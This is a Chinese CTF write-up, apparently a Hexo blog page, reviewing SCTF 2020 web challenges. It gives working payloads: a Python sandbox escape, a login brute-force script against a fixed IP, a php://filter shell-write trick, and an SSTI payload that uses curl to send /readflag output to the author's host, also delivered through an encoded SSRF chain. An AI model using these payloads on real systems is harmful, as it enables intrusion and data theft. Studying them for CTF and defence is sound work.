@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>SCTF比赛复盘 | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    SCTF比赛复盘
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SCTF比赛复盘（2020-06）"><span class="toc-number">1.</span> <span class="toc-text">SCTF比赛复盘（2020.06）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CloudDisk"><span class="toc-number">1.1.</span> <span class="toc-text">CloudDisk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pysandbox"><span class="toc-number">1.2.</span> <span class="toc-text">pysandbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pysandbox2"><span class="toc-number">1.3.</span> <span class="toc-text">pysandbox2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UnsafeDefenseSystem"><span class="toc-number">1.4.</span> <span class="toc-text">UnsafeDefenseSystem</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#条件漏洞成因："><span class="toc-number">1.4.0.1.</span> <span class="toc-text">条件漏洞成因：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jsonhub"><span class="toc-number">1.5.</span> <span class="toc-text">Jsonhub</span></a></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="SCTF比赛复盘（2020-06）"><a href="#SCTF比赛复盘（2020-06）" class="headerlink" title="SCTF比赛复盘（2020.06）"></a>SCTF比赛复盘（2020.06）</h1><p>原文链接：<a href="http://phoebe233.cn/index.php/archives/53/[](http://phoebe233.cn/index.php/archives/53/)" target="_blank" rel="noopener">http://phoebe233.cn/index.php/archives/53/[](http://phoebe233.cn/index.php/archives/53/)</a></p>
+<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>我还以为是考察文件上传漏洞，上传了一句话木马。</p>
+<p>题目给的Koa框架教程：<a href="http://www.ruanyifeng.com/blog/2017/08/koa.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2017/08/koa.html</a></p>
+<pre><code class="c">const fs = require(&#39;fs&#39;);
+const path = require(&#39;path&#39;);
+const crypto = require(&#39;crypto&#39;);
+const Koa = require(&#39;koa&#39;);
+const Router = require(&#39;koa-router&#39;);
+const koaBody = require(&#39;koa-body&#39;);/
+const send = require(&#39;koa-send&#39;);
+
+const app = new Koa();
+const router = new Router();
+const SECRET = &quot;?&quot;
+app.use(koaBody({
+  multipart: true,
+  formidable: {
+      maxFileSize: 2000 * 1024 * 1024 
+  }
+}));//koabody用来设置ctx.response.body的?使用app.use加载这个函数?
+
+
+router.post(&#39;/uploadfile&#39;, async (ctx, next) =&gt; {
+    const file = ctx.request.body.files.file;
+    //是用ctx.request.body.files来获取文件的，这是老版本koa的用法，正确的应该是用ctx.request，操作在下边(可供参考：https://github.com/dlau/koa-body/issues/75)
+    const reader = fs.createReadStream(file.path);
+    let fileId = crypto.createHash(&#39;md5&#39;).update(file.name + Date.now() + SECRET).digest(&quot;hex&quot;);
+    let filePath = path.join(__dirname, &#39;upload/&#39;) + fileId
+    const upStream = fs.createWriteStream(filePath);
+    reader.pipe(upStream)
+    return ctx.body = &quot;Upload success ~, your fileId is here：&quot; + fileId;
+  });
+//用koa实现文件上传下载，上传的东西会原模原样下载
+
+router.get(&#39;/downloadfile/:fileId&#39;, async (ctx, next) =&gt; {
+  let fileId = ctx.params.fileId;
+  ctx.attachmentctx.attachment(fileId);
+  try {
+    await send(ctx, fileId, { root: __dirname + &#39;/upload&#39; });
+  }catch(e){
+    return ctx.body = &quot;SCTF{no_such_file_~}&quot;
+  }
+});
+
+router.get(&#39;/&#39;, async (ctx, next) =&gt; {
+  ctx.response.type = &#39;html&#39;;
+  ctx.response.body = fs.createReadStream(&#39;index.html&#39;);
+
+});
+
+app.use(router.routes());
+app.listen(3333, () =&gt; {
+  console.log(&#39;This server is running at port: 3333&#39;)
+})</code></pre>
+<blockquote>
+<p>koa-body模块还可以用来处理文件上传。请看下面的例子。</p>
+<pre><code>// demos/21.js
+const os = require(&#39;os&#39;);
+const path = require(&#39;path&#39;);
+const koaBody = require(&#39;koa-body&#39;);
+
+const main = async function(ctx) {
+  const tmpdir = os.tmpdir();
+  const filePaths = [];
+  const files = ctx.request.body.files || {};
+
+  for (let key in files) {
+    const file = files[key];
+    const filePath = path.join(tmpdir, file.name);
+    const reader = fs.createReadStream(file.path);
+    const writer = fs.createWriteStream(filePath);
+    reader.pipe(writer);
+    filePaths.push(filePath);
+  }
+
+  ctx.body = filePaths;
+};
+
+app.use(koaBody({ multipart: true }));</code></pre><p>运行这个 demo。</p>
+<pre><code>$ node demos/21.js</code></pre><p>打开另一个命令行窗口，运行下面的命令，上传一个文件。注意，<code>/path/to/file</code>要更换为真实的文件路径。</p>
+<pre><code>$ curl --form upload=@/path/to/file http://127.0.0.1:3000
+[&quot;/tmp/file&quot;]</code></pre></blockquote>
+<p>使用request.body.files会导致用户可控path，那么可以构造json将其指向要读的文件，然后下载的文件就可控了</p>
+<p><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL3BVUHFCc05ya09ROGJWOHQucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL3BVUHFCc05ya09ROGJWOHQucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a></p>
+<p>拿去下载</p>
+<p><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL044cE9JMkhQQUV6SVBPZEcucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL044cE9JMkhQQUV6SVBPZEcucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a></p>
+<p>如果没有该文件会error，先读/proc/self/environ，得知路径为/app，</p>
+<p><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL0txbUt1bTVuZ0xOTDNHZDQucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL0txbUt1bTVuZ0xOTDNHZDQucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br>在/app/flag下找到flag<br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mLzdlTENtN1FFOVFJSXVEODkucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mLzdlTENtN1FFOVFJSXVEODkucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1Q1aVE3bWJRa1ViQXF3TzMucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1Q1aVE3bWJRa1ViQXF3TzMucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a></p>
+<p>用postman？：<a href="https://www.cnblogs.com/jiayuchn-test/p/8876478.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiayuchn-test/p/8876478.html</a></p>
+<p>官方wp :</p>
+<p><img src="/2020/07/08/SCTF%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/C:%5CUsers%5CDELL%5CPictures%5Cclouddisk.png" alt="clouddisk"></p>
+<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><pre><code class="python">from flask import Flask, request
+app = Flask(__name__)
+@app.route(&#39;/&#39;, methods=[&quot;POST&quot;])
+def security():
+    secret = request.form[&quot;cmd&quot;]
+    for i in secret:
+        if not 42 &lt;= ord(i) &lt;= 122: return &quot;error!&quot;
+    exec(secret)
+    return &quot;xXXxXXx&quot;
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&quot;0.0.0.0&quot;)</code></pre>
+<p>过滤空格引号小括号等，想执行函数比较困难，可以通过改写flask的静态文件夹来将static目录指向/app<br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL01DS0hRRWhjdk9IZmxoTnUucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL01DS0hRRWhjdk9IZmxoTnUucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL2tOdzBlUU5KWE5hT0xDSGwucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL2tOdzBlUU5KWE5hT0xDSGwucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a></p>
+<blockquote>
+<p>static_url_path:<br> 前端访问资源文件的前缀目录。默认是<code>/static</code>，就是前端必须这样访问：<code>&lt;img src=&quot;/static/img/mylogo.jpg&quot; /&gt;</code><br> 我们改成 ‘’，就可以这样访问了：<code>&lt;img src=&quot;/img/mylogo.jpg&quot; /&gt;</code>。就达到前端从<strong>根目录</strong>访问的目的了。</p>
+<p>static_folder:<br> 后端存储资源文件的目录。默认是<code>/static</code>，就是指明你后端的资源文件，是放在<code>&lt;your project&gt;/static/</code>目录下，一般不需要改动。<br>链接：<a href="https://www.jianshu.com/p/5722fef5fa96" target="_blank" rel="noopener">https://www.jianshu.com/p/5722fef5fa96</a></p>
+<ol>
+<li><p>template_folder 是存放页面的文件夹，默认是templates    </p>
+</li>
+<li><p>static_folder 是静态文件夹的名字  </p>
+</li>
+<li><p>static_url_path 是静态文件的路径，跟前端页面中的url路径一致</p>
+<p>原文链接：<a href="https://www.cnblogs.com/zhufanyu/p/11937932.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhufanyu/p/11937932.html</a></p>
+</li>
+</ol>
+</blockquote>
+<p>反弹shell：<a href="https://blog.csdn.net/Aaron_Miller/article/details/106825087" target="_blank" rel="noopener">https://blog.csdn.net/Aaron_Miller/article/details/106825087</a></p>
+<p>知乎这个有一点点用吧：<a href="https://www.zhihu.com/question/24503813" target="_blank" rel="noopener">https://www.zhihu.com/question/24503813</a></p>
+<h2 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h2><p>1、题目要求必须rce</p>
+<blockquote>
+<p>RCE英文全称：remote command/code execute<br>分为远程命令执行ping和远程代码执行evel。<br>漏洞出现的原因：没有在输入口做输入处理。<br>我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p>
+<p>应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_ exec、passthru、pcntl_exec、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞</p>
+<p>原文链接：<a href="https://blog.csdn.net/qq_41453285/java/article/details/100777421" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/java/article/details/100777421</a></p>
+<p><a href="https://blog.csdn.net/qq_43814486/article/details/90020139" target="_blank" rel="noopener">https://blog.csdn.net/qq_43814486/article/details/90020139</a></p>
+</blockquote>
+<p>2、<code>__builtins__</code>是python的内建函数的内建命名空间，dir看一下有ord</p>
+<p>备注：<code>dir(__builtins__)查看python中所用BIF（内置函数）</code></p>
+<p>参考：<a href="https://www.cnblogs.com/GiraffaMPRO/p/6011698.html" target="_blank" rel="noopener">https://www.cnblogs.com/GiraffaMPRO/p/6011698.html</a></p>
+<p>3、将其改写为lambda匿名函数，先覆盖ord，让其返回42-122之间的数即可，确保不会error</p>
+<pre><code class="python">__builtins__.ord=lambda*args:45</code></pre>
+<p>备注：ord()函数功能：返回字符对应的十进制数</p>
+<p>4、然后再将路由函数覆盖掉</p>
+<pre><code class="python">app.view_functions[&#39;security&#39;] = lambda: __import__(&#39;os&#39;).popen(&#39;id&#39;).read()</code></pre>
+<p><a href="https://img-blog.csdnimg.cn/20200706154844967.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200706154844967.png" alt="img"></a></p>
+<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>进去直接跳转<br><a href="https://img-blog.csdnimg.cn/20200708110902972.jpg" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708110902972.jpg" alt="img"></a><br>/public/log.txt<br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1RLYjV4c3hzRnE3VnNWbTMucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1RLYjV4c3hzRnE3VnNWbTMucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br>protect.py直接访问就有，大概是一个文件备份还原的东西</p>
+<p>/public/test的源码中有注释登陆地址</p>
+<p><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL3VqblNQWVhpV0kzc0hGcXQucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL3VqblNQWVhpV0kzc0hGcXQucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br>进一步信息搜集<br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL0ZpV29VRExQbnU3UjNBaHEucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL0ZpV29VRExQbnU3UjNBaHEucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br>拿去爆破生日，得到1221</p>
+<pre><code class="python">import requests
+import base64
+username=&#39;Admin1964752&#39;
+
+url=&#39;http://8.208.102.48/public/nationalsb/login.php&#39;
+s=[]
+# for i in range(101,132):
+#     s.append(i)
+# for i in range(201,232):
+#     s.append(i)
+# for i in range(301,332):
+#     s.append(i)
+# for i in range(401,432):
+#     s.append(i)
+# for i in range(501,532):
+#     s.append(i)
+# for i in range(601,632):
+#     s.append(i)
+# for i in range(701,732):
+#     s.append(i)
+# for i in range(801,832):
+#     s.append(i)
+# for i in range(901,932):
+#     s.append(i)
+# for i in range(1001,1032):
+#     s.append(i)
+# for i in range(1101,1132):
+#     s.append(i)
+for i in range(1201,1232):
+    s.append(i)
+for i in s:
+    password = &#39;DsaPPPP!@#amspe&#39;
+    if i &lt; 1000:
+        password=password+&#39;0&#39;
+    password=password+str(i)
+    data=base64.b64encode((username+&#39;:&#39;+password).encode()).decode()
+    print(data)
+    headers={
+        &#39;Authorization&#39;:&quot;Basic &quot;+data
+    }
+    res=requests.get(url,headers=headers)
+    print(res.text)
+#print(str)</code></pre>
+<p>登陆之后提示我们可以查看文件<br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mLzh3SUtXaUZaSUY4dlEyenAucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mLzh3SUtXaUZaSUY4dlEyenAucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br>但是对flag、log等字符做了过滤，所以日志包含是不太可能了，/var/www/html/application/index/controller/Index.php读到反序列化代码</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index extends \think\Controller{
+  public function index(){
+      $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+    echo &quot;Warning&quot;.&quot;&lt;br/&gt;&quot;;
+    echo &quot;You IP: &quot;.$ip.&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;;
+    echo &#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#39;;  
+  }
+  public function hello(){
+      unserialize(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
+    echo(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
+  }
+}</code></pre>
+<p>结合thinkphp5.0.24，应该是反序列化写shell然后文件包含<br><a href="http://pines404.online/2020/01/20/代码审计/ThinkPHP/ThinkPHP5.0.24反序列化链分析/" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>
+<p>这里还会被拼接上exit()，可以改成utf7的来绕(后面看了一下phpinfo开启了短标签所以不能用rot13)</p>
+<pre><code class="php">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=</code></pre>
+<p><a href="https://img-blog.csdnimg.cn/20200706101316996.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200706101316996.png" alt="img"></a><br>写上后在log.txt可以看到文件，手打经常not found，所以用条件竞争来包含<br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1Z2eHFsWFNaT0J6dm8yNEIucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1Z2eHFsWFNaT0J6dm8yNEIucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br>再发一次包，vps收到flag<br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL2xKTndHM2htNTM3TEVZYXkucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL2xKTndHM2htNTM3TEVZYXkucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a><br><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1ozTFNta0lGWVhxRE9CSzgucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" target="_blank" rel="noopener"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWRlci5zaGltby5pbS9mL1ozTFNta0lGWVhxRE9CSzgucG5nIXRodW1ibmFpbA?x-oss-process=image/format,png" alt="img"></a></p>
+<blockquote>
+<p><strong>条件竞争：</strong>系统中，最小的运算调度单位是线程，而每个线程又依附于一个进程，条件竞争则是多进程 或多线程对一个共享资源操作，因为操作顺序 不受控的时候所产生的问题。</p>
+<p><strong>进程：</strong>进程是为了更好的利用CPU的资源；进程是系统进行资源分配和调度的一个独立单位；每个进程都有自己的独立内存空间，不同进程 通过进程间通信来通信；由于进程比较重要，占据独立的内存，所以上 下文进程间的切换开销（栈、寄存器、虚拟内 存、文件句柄等）比较大，但相对比较稳定安 全。</p>
+<p><strong>线程：</strong>线程的是为了降低上下文切换的消耗，提高系 统的并发性，并突破一个进程只能干一样事的 缺陷，使到进程内并发成为可能。 线程是进程的一个实体,是CPU调度和分派的基 本单位,它是比进程更小的能独立运行的基本单 位。线程自己基本上不拥有系统资源,只拥有一点在 运行中必不可少的资源(如程序计数器,一组寄 存器和栈),但是它可与同属一个进程的其他的 线程共享进程所拥有的全部资源。 线程间通信主要通过共享内存，上下文切换很 快，资源开销较少，但相比进程不够稳定容易 丢失数据。</p>
+<p><strong>协程：</strong>协程通过在线程中实现调度，避免了陷入内核 级别的上下文切换造成的性能损失，进而突破 了线程在IO上的性能瓶颈。协程拥有自己的寄存器上下文和栈。 程调度切换时，将寄存器上下文和栈保存到其 他地方，在切回来的时候，恢复先前保存的寄 存器上下文和栈，直接操作栈则基本没有内核 切换的开销。</p>
+<p><strong>并发编程：</strong>并发编程在实际情况是为了提高执行效率，提高系统的利用率。 </p>
+<h4 id="条件漏洞成因："><a href="#条件漏洞成因：" class="headerlink" title="条件漏洞成因："></a><strong>条件漏洞成因：</strong></h4><p>当一个系统运行结果依耐于不可控的事情的先 后顺序的时候，就可能发生竞争。 </p>
+<p>往往程序员可能无法注意到这些事情，因为在 编写程序的时候，往往认为程序一条线执行下 来，但是一个线程在运行中是可能被随时打断 ，并且挂起，然后去执行其他线程的逻辑。导致出现了设计人员意料之外的情况，最终出现 bug。</p>
+<p><strong>漏洞产生条件：</strong>task1先对共享的空间进行了一个安全性检查，检查完之后，task2紧 接着修改了共享空间的内容，导致task1的安全性检查边的不可控， 甚至可以是一个不安全的数据，然而再次在获取数据的时候，就可能 出现预期之外的情况，严重的可能导致程序执行流被劫持。 </p>
+<p>但是在程序员的角度，从check到get这个过程中共享空间的内容是 不会变的，但是对于多线程来说，这个是未知的。</p>
+<p><img src="https://img-blog.csdnimg.cn/20181112134448938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsZXhZb3VuZzI4,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p><strong>并发</strong>，即至少存在两个并发执行流</p>
+<p>这里的执行流包括线程，进程，任务等级别的执行流</p>
+<p><strong>共享对象</strong>，即多个并发流会访问同一对象</p>
+<p>常见的共享对象有共享内存，文件系统，信号，这些 共享对象是用来使得多个程序执行流相互交流。</p>
+<p><strong>改变对象</strong>，即至少有一个控制流会改变竞争对象 的状态。</p>
+<p>因为如果程序只是对对象进行读操作，那么并不会产 生条件竞争。</p>
+<p>原文链接：<a href="https://blog.csdn.net/AlexYoung28/java/article/details/83990562" target="_blank" rel="noopener">https://blog.csdn.net/AlexYoung28/java/article/details/83990562</a></p>
+</blockquote>
+<h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>django80，flask5000，flask需要ssrf访问<br>/reg的数据json解析然后直接注册<br><a href="https://img-blog.csdnimg.cn/20200708145651261.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708145651261.png" alt="img"></a><br>构造json：</p>
+<pre><code class="json">{&quot;username&quot;:&quot;wander1&quot;,&quot;password&quot;:&quot;123&quot;,&quot;is_staff&quot;:1,&quot;is_superuser&quot;:1,&quot;is_active&quot;: 1}</code></pre>
+<p><a href="https://img-blog.csdnimg.cn/20200708144231861.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708144231861.png" alt="img"></a><br>登陆拿到token<br><a href="https://img-blog.csdnimg.cn/20200708144216792.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708144216792.png" alt="img"></a><br>token是用来ssrf的<br><a href="https://img-blog.csdnimg.cn/20200708145919708.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708145919708.png" alt="img"></a><br>/home路由下有一个白名单判断，要求符合</p>
+<pre><code class="python">if url.startswith(&quot;http://&quot; + white_list[i] + &quot;/&quot;):</code></pre>
+<p>django版本为2.0.7，有url跳转的cve<a href="https://img-blog.csdnimg.cn/20200708150115514.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708150115514.png" alt="img"></a><br>这里要求以<a href="http://39.104.19.182/开头，构造如下即可绕过" target="_blank" rel="noopener">http://39.104.19.182/开头，构造如下即可绕过</a></p>
+<pre><code>http://39.104.19.182//x.x.x.x</code></pre><p>/rpc下需要ssrf，然后会将我们传过来的数据request访问，因为这里还有一个web2flask，并且存在ssti<br><a href="https://img-blog.csdnimg.cn/20200708150443671.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708150443671.png" alt="img"></a><br>这里num12不能为字母，symobls需要匹配到其中之一：<code>+\-*/</code>，然后将其拼接传给模板</p>
+<p>两种方法，第一是因为这里data处用了get_json()</p>
+<pre><code class="python">data = request.get_json()</code></pre>
+<p>而是支持unicode的所以可以用unicode绕过</p>
+<pre><code class="python">{&quot;num1&quot;:&quot;&quot;,&quot;num2&quot;:&quot;&quot;,&quot;symbols&quot;:&quot;{\u007b [].__class__.__base__.__subclasses__()[64].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__import__(&#39;os&#39;).system(&#39;curl phoebe233.cn:1234/`/readflag` &#39;)\&quot;)}\u007d&quot;}</code></pre>
+<p>第二种是官方wp里提到的flask的get_json()方法会通过传入的body自动判断编码然后解码，那就可以特殊编码如utf16绕</p>
+<p>还有一种：<a href="https://bycsec.top/2020/07/05/SCTF2020-writeup/" target="_blank" rel="noopener">https://bycsec.top/2020/07/05/SCTF2020-writeup/</a><br>num={,symbols={payload},num2=}</p>
+<p>payload构造好后ssrf打127.0.0.1django/rpc，然后让rpc去帮我们向flask请求打ssti</p>
+<pre><code class="json">{
+    &quot;token&quot;: &quot;3ad9af405504233188f694a11ff22115&quot;,
+    &quot;url&quot;: &quot;http://39.104.19.182//127.0.0.1:8000/rpc?methods=POST&amp;url=http://127.0.0.1:5000/caculator&amp;data=eyJudW0xIjoiIiwibnVtMiI6IiIsInN5bWJvbHMiOiJ7XHUwMDdiJzEnLl9fY2xhc3NfXy5tcm8oKVstMV0uX19zdWJjbGFzc2VzX18oKVs2NF0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydldmFsJ10oXCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCBwaG9lYmUyMzMuY24vYC9yZWFkZmxhZ2AnKVwiKX1cdTAwN2Qi&quot;
+}</code></pre>
+<p><a href="https://img-blog.csdnimg.cn/20200708152555263.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708152555263.png" alt="img"></a><br><a href="https://img-blog.csdnimg.cn/20200708152609475.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20200708152609475.png" alt="img"></a></p>
